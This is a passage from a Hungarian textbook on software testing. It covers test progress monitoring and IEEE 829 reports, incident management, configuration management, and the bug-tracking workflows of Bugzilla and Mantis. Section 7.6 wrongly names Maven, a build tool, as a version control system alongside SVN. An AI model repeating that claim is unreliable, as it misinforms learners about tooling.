7.4 A tesztfolyamat ellenõrzése és követése
A teszt terv meghatározza, hogy milyen tevékenységeket kell végrehajtani. A tesztelési
folyamat során folyamatosan nyilván kell tartani, hogy az elõírt feladatok közül mit, és
milyen eredménnyel hajtottunk végre az adott idõpontig. A teszt monitorig célja a tesztelési
tevékenység elõrehaladásának a követése.
A tesztelés elõrehaladását jelzõ adatok összegyûjtése történhet manuálisan, nyilvántartva
azokat egy papírlapon, vagy egy Excel táblában, de hatékonyabb a teszt automatizálási
eszközök használata. A teszt folyamat elõrehaladását mérõszámokkal jellemezhetjük.
Alkalmazható mérõszámok:
• A használati esetek hány százalékára készült teszt terv.
• A megtervezett tesztesetek hány százaléka lett végrehajtva, ebbõl mennyi a hiba
nélküli.
• Kód lefedettségi mérõszámok.
• A tesztelési határidõkre az adott határidõre tervezett tevékenységek hány százaléka
lett végrehajtva.
Ahhoz, hogy a projekt menedzsment áttekinthesse a munka elõrehaladását, gyakran
alkalmazunk grafikonokat a fenti mérõszámok szemléltetésére.
7.4.1 Teszt jegyzõkönyvek
A tesztelési tevékenység elõrehaladásáról a teszt vezetõ a tesztelõk által készített
jelentésekbõl tájékozódhat. Ezek a jelentések tartalmazhatják az alábbiakat:
• Milyen tevékenységeket hajtottak végre az adott idõszakban.
• A végrehajtott tevékenységeket jellemzõ metrikák, amelyekkel megbecsülhetõ, hogy
mennyi hiba maradt még a rendszerben, illetve mennyi erõforrást igényelhet a
maradék hibák felderítése.
Az IEE 829 szabvány a teszt elõrehaladási jegyzõkönyvre az alábbi tartalomjegyzéket
javasolja:
1. Teszt jegyzõkönyv azonosító
2. Összefoglalás
3. Általános értékelés
4. Eredmények összegzése
5. Elõrehaladás
6. A tevékenységek összefoglalása
7.4.2 Teszt folyamat ellenõrzése
A fenti információk értékelésével a tesztmérnök képes követni a tesztelési tevékenység
elõrehaladását, és összevetheti azt a teszt tervben elõírt határidõkkel. Az így nyert
információk birtokában, ha szükségesnek látja, módosíthatja a tesztelési tervben foglaltakat. 
Szoftver tesztelés
7-8
Lehetséges tevékenységei:
• Átértékeli a tesztek prioritásait, ha úgy látja, hogy elõre nem látható kockázatok
léptek fel.
• Megváltoztatja a teszt ütemtervet.
• Megváltoztatja a teszt kritériumokat,a megváltozott prioritásokhoz igazítva.
• Átértékeli a termék kockázatokat, és ennek megfelelõen módosítja a tesztelési tervet.
A tesztelés elõrehaladásának értékelése során a teszt vezetõ olyan problémákat is
felderíthet, amelyeknek megoldása meghaladja a hatáskörét. Ilyen esetekben a projekt
menedzserrel kell egyeztetnie, és például az alábbiakat tanácsolhatja:
• Egyes kevésbé fontos funkciókat ki kell venni a követelmény listából, hogy a határidõt
tartani lehessen.
• Módosítani kell az átadási határidõt, hogy a még szükséges tesztelési
tevékenységeket végre lehessen hajtani.
• Át lehet adni a rendszert, de a felhasználóval tudatni kell, hogy bizonyos funkciók
még nem lettek alaposan tesztelve. Ilyenkor az üzemszerû használat mellett
folytatódhat a tesztelés. Ez abban az esetben lehet alternatíva, ha a gyengén tesztelt
funkciók a gyakorlatban ritkán fordulnak elõ.
7.5 Incidens menedzsment
Az incidens a rendszer nem tervezett, váratlan viselkedése, amely további vizsgálatokat
igényel.
A tesztelés idõszakában az incidensek fellépése gyakori lehet, de a rendszer váratlan
viselkedése az éles használat közben is jelentkezhet.
Az incidens kezelés az IEEE 1044 (Standard Classification for Software Anomalies) szabvány
szerint: „ A specifikációtól eltérõ viselkedés felismerése, megvizsgálása, és az elhárítására
tett intézkedések együttese.”
Az incidensek jelentése a tesztelési folyamat során igen gyakori tevékenység. Eszköze lehet
egy telefonhívás, egy feljegyzés, egy e-mail. Ezeknek az ad-hoc eszközöknek az elõnye az
egyszerûség és a gyorsaság, de hátrányuk, hogy a jelentésnek nem marad nyoma, és a
megoldás státusza nem követhetõ. Ezért az incidensek jelentésére célszerû valamilyen erre a
célra dedikált szoftvert használni. Ezek az eszközök az incidens jelentésétõl annak
megoldásáig képesek követni a folyamatokat. Erre alkalmas eszközökre a jegyzet késõbbi
fejezetébe láthatunk példát.
7.6 Konfiguráció menedzsment
A fejlesztés folyamata a jelenleg használt inkrementális fejlesztési stratégia alapján a szoftver
különbözõ verzióinak elõállítását jelenti. Ez a tesztelési folyamatra nézve azt jelenti, hogy a
teszteket a rendszer egymás után következõ verzióira kell elvégezni. 
Szoftver tesztelés
7-9
A rendszer fejlõdése során a korábbi rendszer verziókra lefuttatott teszteket a
továbbfejlesztett verziókra is le kell futtatni, bizonyítva azt, hogy a továbbfejlesztés nem
okozott hibát a korábban már implementált funkciók végrehajtásában.
Az inkrementális fejlesztési stratégiát követve tehát a rendszer, és annak helyességét
ellenõrzõ tesztesetek számos verziója keletkezik. Az egyes verziókhoz tartozó forráskódok,
dokumentációk és tesztesetek nyilvántartására és kezelésére célszerû valamilyen
verziókezelõ rendszert használni. A jegyzet írás idején a legtöbbet használt rendszerek erre a
célra az SVN és a Maven programok. Ezek free szoftverek.
 


Szoftver tesztelés
9-1
9 Hibakövetõ rendszerek
Egy szoftver készítése során és átadása után is merülhetek fel problémák a mûködéssel
kapcsolatban. A szoftver készítése során és gyakran az átadás után is tesztelõk keresnek
hibákat, illetve az átadás után a felhasználók futhatnak be egy-egy hibába. Ezeket a hibákat
javítani kell, amihez a programozóknak értesülniük kell a hibákról. A hiba felfedezõje és a
fejlesztõk között a hibakövetõ (bug tracking) rendszerek teremtik meg a kapcsolatot. A
hibakövetõ rendszereket néha hívják hibabejelentõ rendszereknek is. Hibakövetõ rendszer
például:
 a JIRA,
 a BugTracker.NET,
 a Mantis,
 és a Bugzilla is.
Ebben a jegyzetben a Bugzilla és a Mantis rendszert mutatjuk be.
9.1 Bugzilla
A hibakövetõ rendszerek legfontosabb tulajdonsága, hogy milyen életútja lehet a hibának a
rendszeren belül. Ezt a hibakövetõ rendszer állapot gépe írja le. Az alábbi ábrán a Bugzilla
állapot gépét láthatjuk: 
Szoftver tesztelés
9-2
A hiba legegyszerûbb életútja a következõ:
 A hibát bejelenti a tesztelõ vagy a felhasználó. Fontos, hogy minél részletesebb
legyen a hiba leírása, hogy reprodukálható legyen. Ekkor a hiba Új állapotú lesz.
 Az új hibákról értesítést kap a vezetõ fejlesztõ, aki a hibát hozzárendeli az egyik
fejlesztõhöz, általában ahhoz, aki a hibás funkciót fejlesztette. Ekkor a hiba 
Szoftver tesztelés
9-3
Hozzárendelt állapotba kerül.
 A fejlesztõ a hozzárendelt hibát megpróbálja reprodukálni. Ha ez sikerül és megtalálja
a hiba okát is, akkor javítja a hibát. A javítást feltölti a verziókövetõ rendszerbe, majd
jelzi, hogy megoldotta a hibát. Ilyenkor érdemes egy regressziós tesztet csinálni, hogy
meggyõzõdjünk, hogy a javítás nem okoz-e más hibákat. Ekkor a hiba Megoldott
állapotú lesz.
 A megoldott hiba visszakerül az azt bejelentõ tesztelõhöz, vagy esetleg egy másikhoz.
A tesztelõ ellenõrzi, hogy tényleg megoldódott a hiba. Ha igen, akkor véget ér a hiba
életútja, az állapota lezárt lesz.
Az optimális lefutástól sok helyen eltérhetünk. Például kiderül, hogy a hiba nem
reprodukálható, vagy a megoldott hibáról kiderülhet, hogy még mindig fennáll. Ezeket a
lehetõségeket mind lefedi a fenti állapotgép.
9.2 Mantis
Ebben a fejezetben a Mantis (magyarul imádkozó sáska) ingyenes hibakövetést támogató
rendszert mutatjuk be. Az alábbi ábra a Mantis állapot gépét szemlélteti. Itt láthatjuk, hogy
az egyes állapotokból, hogyan jut át a másikba a hiba. 
Szoftver tesztelés
9-4
Tekintsük át, hogyan halad a folyamat egy hiba bejelentésétõl annak lezárásáig. Elõször is a
rendszerhez hozzáféréssel kell rendelkeznie a bejelentõnek. Viszonylag egyszerû, ha belsõ
tesztelésrõl van szó, mert ott többnyire adott a jogosultság a hibabejelentésre. Származhat a
bejelentés a megrendelõtõl is, aki kapott tesztelésre egy korai verziót, vagy ami rosszabb,
már rendelkezik egy kész, kiadott verzióval. Elképzelhetõ olyan bejelentés is, amikor mi
vesszük fel a rendszerbe a hibát, az ügyfél telefonos elmondása, vagy levele alapján. A hiba 
Szoftver tesztelés
9-5
bejelentõje a rendszerbe bejelentkezve láthatja minimum a saját maga bejelentette hibákat,
állapotukat és a hozzá fûzött megjegyzéseket, valamint õ maga is további információkat
fûzhet a bejelentéshez, sõt, erre gyakran meg is kérik a hibajavítók a bejelentõt.
A Mantis rendszerben vázlatosan az alábbi módon történik a hibakezelés:
 A hibát bejelentik. Ezt a hibabejelentést a hibás szoftverhez rendeljük (hiszen egy
hibakövetõ rendszer több szoftver hibáit, illetve egy szoftver több verziójának hibáit
is tartalmazhatja), elláthatjuk kategóriával, reprodukálhatósággal és
súlyossággal. Kezdetben állapota Új lesz, ami a késõbbiekben folyamatosan változik,
a hiba javítása során.
 Kategóriákat magunk adhatunk meg a tesztelt rendszer igényei szerint. A
késõbbiekben, a hibákat bejelentõ felhasználók, ezekbe a kategóriákba sorolhatják a
hibákat.
 A bejelentésnek lehet reprodukálhatósága:
 Mindig: Leírásában megadott lépéseket megismételve, a hiba mindig jelentkezik.
 Néha: Nem minden esetben jelentkezik. Ez többszálú programokra jellemzõ.
 Véletlenszerû: Véletlenszerûen jelentkezik. Ebben az esetben nagyon fontos,
hogy megadjuk a hiba észlelésének pontos idõpontját, hogy a fejlesztõk a
rendszer napló állományban visszakereshessék a hiba elõtti állapotot, amibõl
rekonstruálható a hibát kiváltó események sora.
 Nem ismételhetõ: Nem tudtuk megismételni. Ebben az esetben is nagyon fontos,
hogy megadjuk a hiba észlelésének pontos idõpontját.
 A bejelentésnek lehet súlyossága:
 Funkció: Funkció hibás mûködése.
 Nyilvánvaló: Megjelenítés, rossz szövegigazítás, egyéb szoftver ergonómiai hiba.
 Szöveg: Elírás, helyesírási hiba.
 Nem súlyos: Kisebb, általában funkcionális hiba, aminek létezik egyszerû
megkerülõ megoldása.
 Súlyos: Valamely funkció teljesen hibásan mûködik.
 Összeomlás: A hiba a rendszer összeomlását eredményezi.
 Akadály: Vagy a fejlesztés, vagy a tesztelés nem folytatható, amíg ez a hiba
fennáll.
 A bejelentés állapota lehet:
 Új: Olyan bejelentés, amihez még senki sem nyúlt.
 Elismert: A vezetõ fejlesztõ elismeri a hiba létét, de még nem osztotta ki, mert 
Szoftver tesztelés
9-6
például nincs elég információ a hibáról.
 Visszajelezés: A hiba leírását pontosítani kell, a fejlesztõk további információt
kérnek a hibáról.
 Hozzárendelt: A hibához fejlesztõ lett rendelve.
 Megoldott: Megoldás született a bejelentésre.
 Lezárt: A bejelentés lezárásra került.
A projekt felelõse figyeli az érkezõ bejelentéseket és a megfelelõ fejlesztõhöz rendeli a hibát.
Ez úgy is történhet, hogy kiadja egy-két fejlesztõnek, hogy nézzék át a bejelentéseket és
kezdjék meg a hibák javítását. Egy hibát általában hozzá lehet rendelni máshoz és
magunkhoz is. 
Szoftver tesztelés
9-7
A hiba bejelentõje ezután megnézheti, hogy hol tart a javítás. Láthatja, hogy a hiba az Új
állapotból, milyen állapotba került át. Ha már kiosztva állapotú, akkor jogaitól függõen
láthatja azt is, hogy kihez került a hiba, és milyen megjegyzéseket fûztek eddig hozzá.
A javítással megbízott programozó és a hiba bejelentõje gyakran nem ugyanazt a szaknyelvet
beszélik. Ebbõl aztán rengeteg félreértés adódik. A programozó nem érti a bejelentést, a
bejelentõ nem érti, hogy mit nem ért a programozó. Így elég hosszadalmas párbeszéd
alakulhat ki a hibakezelõ rendszer segítségével, ám végül tisztázódik a helyzet, és vagy
lezárják a hibát azzal, hogy ez nem hiba, csak az ügyfél nem olvasta el a kézikönyvet (nagyon
ritkán olvassa el), vagy pedig elkezdi a programozó a javítást.
 Ha kész a javítás, legalábbis amikor a programozó ezt gondolja, akkor a „tesztelésre
vár” státusszal látja el a hibát.
 Ezután többen is tesztelhetik a javítást. Erre szükség is lehet, mivel a több szem
többet lát elv itt fokozottan érvényesül, sõt mi több, a hiba kijavításával esetleg más,
rejtett hibákat okozhattunk, ami ugyan eléggé amatõr eset (azt mutatja, hogy nem
csináltunk regressziós tesztet), de nem kizárt. 
Szoftver tesztelés
9-8
 Ha sikeres a tesztelés, akkor a hibát kijavítottnak jelölhetjük, és ha a bejelentõ is
megelégedett a megoldással, akkor azt a hibabejelentés, megoldás mezõje
segítségével közli.
A fenti módszerrel természetesen nem csak bejelentett hibákat lehet nyomon követni,
hanem akár új igények megvalósítását, vagy akár egész termékek gyártását is követhetjük
vele, ezért hívják ezeket a rendszereket munkakövetõ (issue tracking) rendszereknek is.
Utóbb minden menedzser álmát is ki lehet nyerni a rendszerbõl, azaz mindenféle
grafikonokat és kimutatásokat. Ezen kinyerhetõ adatok között találhatunk fontosakat is, mint
például, hogy mennyit dolgoztunk egy munkán. Ez segít a továbbiakban megbecsülni, hogy
bizonyos típusú munkákat menyi idõ alatt lehet elvégezni.
 

